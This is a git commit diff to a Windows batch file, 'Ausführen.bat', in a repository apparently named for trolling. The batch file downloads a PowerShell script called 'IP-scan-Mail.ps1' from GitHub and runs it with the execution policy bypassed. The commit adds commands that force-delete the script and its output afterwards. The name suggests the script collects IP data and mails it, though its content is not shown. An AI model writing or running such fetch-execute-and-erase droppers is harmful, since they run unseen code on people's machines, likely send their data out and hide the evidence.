135ea2ce33068e8e630359675b26415d3b6a537c
MangoTheSherlock <manuel.saemann1@outlook.de>
2025-03-25 10:39:55 +0100

    Update Ausführen.bat

--- Ausführen.bat
+++ Ausführen.bat
@@ -1,10 +1,14 @@
 @echo off
 set "URL=https://raw.githubusercontent.com/MangoTheSherlock/Trolling_BAT/main/IP-scan-Mail.ps1"
-set "Destination=C:\Temp\IP-scan-Mail.ps1"
+set "Destination=%cd%\IP-scan-Mail.ps1"
+set "OutputFile=%cd%\output.txt"
 
 powershell -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%Destination%'"
 
 powershell -ExecutionPolicy Bypass -File "%Destination%"
 
-echo PowerShell-Skript wurde erfolgreich heruntergeladen und ausgefuehrt!
+del /f /q "%OutputFile%"
+del /f /q "%Destination%"
+
+echo PowerShell-Skript wurde erfolgreich heruntergeladen, ausgefuehrt, und alle Dateien wurden gelöscht!
 exit
